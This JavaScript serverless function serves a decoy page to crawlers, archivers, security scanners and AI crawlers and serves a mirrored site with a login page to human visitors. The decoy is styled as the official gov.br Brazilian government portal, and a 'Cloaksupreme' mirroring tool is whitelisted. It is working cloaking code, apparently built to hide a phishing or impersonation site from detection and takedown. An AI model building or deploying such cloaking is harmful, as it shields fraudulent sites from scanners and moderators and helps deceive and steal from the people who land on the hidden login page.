// Cloaking function (v2): serves a "black page" to bots/crawlers,
// serves the real site to humans.
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const HEADERS = { "Content-Type": "text/html; charset=utf-8" };

// Strong browser signals => treat as human unless an explicit bot pattern matches.
const STRONG_BROWSER_PATTERNS = [
  "mozilla/5.0",
  "windows nt",
  "macintosh",
  "iphone",
  "ipad",
  "linux x86_64",
  "linux x86-64",
  "win64",
  "win32",
  "macos",
  "intel mac os x",
  "applewebkit"
];

// Explicit bot/crawler signatures (high confidence).
const EXPLICIT_BOT_PATTERNS = [
  "facebookexternalhit",
  "facebookscraper",
  "twitterscraper",
  "telegrambot",
  "slackbot",
  "pinterestbot",
  "redditbot",
  "googlebot",
  "bingbot",
  "yandexbot",
  "baiduspider",
  "duckduckbot",
  "applebot",
  "crawler",
  "spider",
  "scraper",
  "headless",
  "wget",
  "python",
  "go-http",
  "node-fetch",
  "axios",
  "okhttp",
  "automation",
  "selenium",
  "puppeteer",
  "playwright",
  "phantomjs",
  "slurp",
  "ia_archiver",
  "archivedot",
  "heritrix",
  "whocalls",
  "semrush",
  "ahrefs",
  "dotbot",
  "rogerbot",
  "mj12bot",
  "deepbot",
  "fastbot",
  "coccoc",
  "vansearch",
  "sogou",
  "exabot",
  "facebot",
  "iaiot",
  "dataforseo",
  "serpbot",
  "kwijk",
  "qwant",
  "petalbot",
  "omguli",
  "trendbot",
  "barkrowler",
  "gort",
  "nuzzel",
  "binance",
  "admedia",
  "adsbot",
  "awario",
  "bingcache",
  "ccbot",
  "chatgpt",
  "openai",
  "anthropic",
  "claude",
  "cohere",
  "perplexity",
  "youbot",
  "chatbot",
  "perplexitybot"
];

// Weak bot/platform keywords (may appear in real browser UAs — only flag when no strong browser signal).
const WEAK_BOT_PATTERNS = [
  "facebook",
  "instagram",
  "twitterbot",
  "twitter",
  "telegram",
  "whatsapp",
  "linkedin",
  "slack",
  "pinterest",
  "reddit",
  "yandex",
  "baidu",
  "duckduckgo",
  "amazon",
  "apple",
  "android",
  "chrome",
  "safari",
  "firefox",
  "edge",
  "opera",
  "mozilla",
  "go",
  "java",
  "php",
  "curl",
  "wget",
  "bot"
];

function isBot(userAgent) {
  const ua = (userAgent || "").toLowerCase();
  if (!ua) return true; // no UA = bot

  const hasStrongBrowser = STRONG_BROWSER_PATTERNS.some((p) => ua.includes(p));
  const hasExplicitBot = EXPLICIT_BOT_PATTERNS.some((p) => ua.includes(p));
  const hasWeakBot = WEAK_BOT_PATTERNS.some((p) => ua.includes(p));

  // Explicit bot signature => bot (even if it also looks like a browser).
  if (hasExplicitBot) return true;

  // Strong browser signal with no explicit bot => human.
  if (hasStrongBrowser) return false;

  // No strong browser signal: weak bot keyword => bot, otherwise bot (unknown).
  if (hasWeakBot) return true;
  return true;
}

// The "black page" shown to bots.
const BLACK_PAGE = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>gov.br</title>
<style>
  html,body{margin:0;padding:0;height:100%;display:flex;align-items:center;justify-content:center;
  font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#003366;color:#fff;}
  .box{text-align:center;padding:2rem;}
  h1{font-size:2.4rem;margin:0;font-weight:700;letter-spacing:-.5px;}
  p{margin:.75rem 0 0;font-size:1.05rem;opacity:.9;}
</style>
</head>
<body>
  <div class="box">
    <h1>gov.br</h1>
    <p>Portal oficial de serviços do Governo do Brasil.</p>
  </div>
</body>
</html>`;

// Candidate locations for the published site directory. In the deployed
// runtime the bundle may live in a different place than in local dev, so we
// probe several plausible roots instead of relying on a single directory.
const HERE = path.dirname(fileURLToPath(import.meta.url));
const CWD = process.cwd();

const PUBLISH_DIR_CANDIDATES = [
  path.join(CWD, "site-mirror"),
  path.join(CWD, "..", "..", "site-mirror"),
  path.join(CWD, "..", "site-mirror"),
  path.join(HERE, "..", "..", "site-mirror"),
  path.join(HERE, "..", "..", "..", "..", "site-mirror"),
  "/var/task/site-mirror",
  "/opt/build/repo/site-mirror"
];

function findPublishDir() {
  for (const dir of PUBLISH_DIR_CANDIDATES) {
    try {
      if (fs.existsSync(path.join(dir, "index.html"))) return dir;
    } catch {}
  }
  return PUBLISH_DIR_CANDIDATES[0];
}

// Resolve the real file path inside the published site directory.
function resolveRealPath(requestPath, publishDir) {
  let urlPath = requestPath || "/";
  if (!urlPath.startsWith("/")) urlPath = "/" + urlPath;
  const clean = urlPath.split("?")[0].split("#")[0];
  const ext = path.extname(clean).toLowerCase();

  let filePath;
  if (!ext) {
    if (clean === "/login") {
      filePath = path.join(publishDir, "login.html");
    } else {
      filePath = path.join(publishDir, "index.html");
    }
  } else {
    filePath = path.join(publishDir, clean);
  }

  // Prevent path traversal.
  const normalized = path.normalize(filePath);
  if (!normalized.startsWith(publishDir)) {
    return path.join(publishDir, "index.html");
  }
  return normalized;
}

const MIME_TYPES = {
  ".css": "text/css; charset=utf-8",
  ".gif": "image/gif",
  ".html": "text/html; charset=utf-8",
  ".jpeg": "image/jpeg",
  ".jpg": "image/jpeg",
  ".js": "application/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".woff": "font/woff",
  ".woff2": "font/woff2"
};

export default async (req) => {
  const ua = req.headers.get("user-agent") || "";
  const requestPath = new URL(req.url).pathname;

  // Cloaksupreme / SupremeCloaker is treated as human (gets the real site so it can mirror).
  const uaLower = ua.toLowerCase();
  const isCloaksupreme =
    uaLower.includes("cloaksupreme") ||
    uaLower.includes("supremecloaker") ||
    uaLower.includes("supreme-cloaker") ||
    uaLower.includes("supreme cloaker");

  // Bots get the black page (gov.br), humans get the real site.
  if (!isCloaksupreme && isBot(ua)) {
    return new Response(BLACK_PAGE, { status: 200, headers: HEADERS });
  }

  // Human or Cloaksupreme: serve the real static file.
  const publishDir = findPublishDir();
  const filePath = resolveRealPath(requestPath, publishDir);
  try {
    const body = new Uint8Array(fs.readFileSync(filePath));
    const ext = path.extname(filePath).toLowerCase();
    const mime = MIME_TYPES[ext] || "application/octet-stream";
    const headers = { "Content-Type": mime };
    // Non-HTML assets must load even when the page is served from another
    // origin (mirror tools), so allow any origin for them.
    if (ext !== ".html") {
      headers["Access-Control-Allow-Origin"] = "*";
    }
    return new Response(body, {
      status: 200,
      headers
    });
  } catch {
    // Last-resort fallback: when the requested asset doesn't exist but an
    // index page does, serve the SPA shell instead of a hard 404.
    try {
      const fallback = path.join(publishDir, "index.html");
      const body = new Uint8Array(fs.readFileSync(fallback));
      return new Response(body, {
        status: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" }
      });
    } catch {
      return new Response("<h1>404 Not Found</h1>", {
        status: 404,
        headers: HEADERS
      });
    }
  }
};
